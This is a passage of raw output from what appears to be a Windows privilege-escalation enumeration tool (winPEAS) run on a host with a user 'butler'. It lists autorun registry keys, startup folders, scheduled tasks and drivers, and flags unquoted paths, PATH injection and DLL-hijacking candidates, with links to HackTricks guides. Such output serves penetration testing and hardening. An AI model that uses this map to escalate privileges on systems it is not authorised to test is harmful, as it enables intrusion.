    C:\Program Files\Windows Media Player(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Multimedia Platform(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows NT(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Photo Viewer(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Portable Devices(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Security(Administrators [WriteData/CreateFiles])
    C:\Program Files\Windows Sidebar(Administrators [WriteData/CreateFiles])
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell(Administrators [WriteData/CreateFiles])


����������͹ Autorun Applications
� Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                      

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [FullControl GenericAll]
    Key: SecurityHealth
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [FullControl GenericAll]
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
    FilePerms: Administrators [AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
    RegPerms: Administrators [FullControl GenericAll]
    Key: SunJavaUpdateSched
    Folder: C:\Program Files (x86)\Common Files\Java\Java Update
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe (Unquoted and Space detected)
    FilePerms: Administrators [AllAccess]
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: butler [FullControl], Administrators [FullControl]
    Key: OneDrive
    Folder: C:\Users\butler\AppData\Local\Microsoft\OneDrive
    FolderPerms: Administrators [AllAccess], butler [AllAccess]
    File: C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: Administrators [AllAccess], butler [AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    RegPerms: Administrators [FullControl GenericAll]
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: butler [Delete], Administrators [AllAccess] (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    RegPerms: Administrators [GenericAll FullControl]
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: butler [Delete], Administrators [AllAccess] (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    RegPerms: Administrators [FullControl GenericAll]
    Key: Userinit
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    RegPerms: Administrators [FullControl GenericAll]
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    RegPerms: Administrators [FullControl]
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    RegPerms: Administrators [FullControl GenericAll]
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    RegPerms: Administrators [FullControl GenericAll]
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    RegPerms: Administrators [FullControl GenericAll]
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    RegPerms: Administrators [FullControl GenericAll]
    Folder: C:\Program Files\Internet Explorer
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [AppendData/CreateDirectories], Administrators [AllAccess]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Windows\System32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Windows\System32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\Installer
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected)                                                                                                                                                 
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    RegPerms: Administrators [FullControl]
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    RegPerms: Administrators [FullControl GenericAll]
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\BHO
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{761497BB-D6F0-462C-B6EB-D4DAF1D92D43}
    RegPerms: Administrators [FullControl GenericAll]
    Folder: C:\Program Files\Java\jre1.8.0_301\bin
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files\Java\jre1.8.0_301\bin\ssv.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{DBC80044-A445-435b-BC74-9C25C1C588A9}
    RegPerms: Administrators [FullControl GenericAll]
    Folder: C:\Program Files\Java\jre1.8.0_301\bin
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files\Java\jre1.8.0_301\bin\jp2ssv.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    RegPerms: Administrators [FullControl GenericAll]
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\BHO
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files (x86)\Microsoft\Edge\Application\89.0.774.68\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: butler [Delete], Administrators [AllAccess]
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: Administrators [AllAccess], butler [Delete]
   =================================================================================================


    Folder: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrators [AllAccess]
    File: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: Administrators [AllAccess]
   =================================================================================================


    Folder: C:\Users\butler\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: Administrators [AllAccess], butler [AllAccess]
    File: C:\Users\butler\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: Administrators [AllAccess], butler [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles], Administrators [AllAccess]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles], Administrators [AllAccess]
   =================================================================================================


    Folder: C:\windows
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\windows\system.ini
    FilePerms: Administrators [AllAccess]
   =================================================================================================


    Folder: C:\windows
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\windows\win.ini
    FilePerms: Administrators [AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup (Unquoted and Space detected)
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\SysWOW64
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup (Unquoted and Space detected)
   =================================================================================================


    Key: From WMIC
    Folder: C:\Users\butler\AppData\Local\Microsoft\OneDrive
    FolderPerms: Administrators [AllAccess], butler [AllAccess]
    File: C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: Administrators [AllAccess], butler [AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Windows\system32
    FolderPerms: Administrators [WriteData/CreateFiles]
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    FolderPerms: Administrators [AllAccess]
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
    FilePerms: Administrators [AllAccess]
   =================================================================================================


����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                          
    (Lespeed Ltd.) Wise Care 365.job: C:\Program Files (x86)\Wise\Wise Care 365\WiseTray.exe -StartTray
    Permissions file: Administrators [AllAccess]
    Permissions folder(DLL Hijacking): Administrators [AllAccess]
    Trigger: At log on of any user
   =================================================================================================

    (Lespeed Ltd.) Wise Turbo Checker.job: C:\Program Files (x86)\Wise\Wise Care 365\WiseTurbo.exe 
    Permissions file: Administrators [AllAccess]
    Permissions folder(DLL Hijacking): Administrators [AllAccess]
    Trigger: At 5:35 AM every day
   =================================================================================================


����������͹ Device Drivers --Non Microsoft--
� Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.12.0 build-8538197 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware PCI VMCI Bus Device - 9.8.6.0 build-3966680 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.20.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
